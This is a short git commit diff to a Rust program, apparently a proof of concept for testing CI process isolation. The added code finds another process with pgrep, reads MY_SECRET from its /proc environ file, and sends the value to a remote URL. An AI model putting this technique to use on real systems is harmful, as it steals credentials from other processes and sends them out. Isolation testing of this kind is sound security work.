3be16d82e2c6571013ba6de7d25e8df0ec28e62c
Delan Azabani <delan@azabani.com>
2025-07-16 11:13:29 +0800

    process: find and exfiltrate secret

--- process_workload/src/main.rs
+++ process_workload/src/main.rs
@@ -1,5 +1,6 @@
-use std::{env, error::Error, process::Command, thread::sleep, time::Duration};
+use std::{env, error::Error, fs::File, io::Read, process::Command, thread::sleep, time::Duration};
 
+use cmd_lib::run_fun;
 use reqwest::blocking::get;
 
 fn main() -> Result<(), Box<dyn Error>> {
@@ -8,7 +9,22 @@ fn main() -> Result<(), Box<dyn Error>> {
     if env::args().nth(1).as_deref() == Some("child") {
         for _ in 0..10 {
             sleep(Duration::from_secs(1));
-            get("https://ci0.servo.org/secret")?;
+            let Ok(pid) = run_fun!(pgrep -f "sleep 900") else {
+                println!("pid not found");
+                continue;
+            };
+            println!("found pid {pid}");
+            let mut environ = vec![];
+            File::open(format!("/proc/{pid}/environ"))?.read_to_end(&mut environ)?;
+            for var in environ.split(|byte| *byte == 0) {
+                if let Some(secret) = var.strip_prefix(b"MY_SECRET=") {
+                    let secret = str::from_utf8(secret)?;
+                    println!("found secret: {secret}");
+                    get(format!("https://ci0.servo.org/secret?value={secret}"))?;
+                    return Ok(());
+                }
+            }
+            println!("secret not found");
         }
     } else {
         Command::new("target/debug/process_workload")
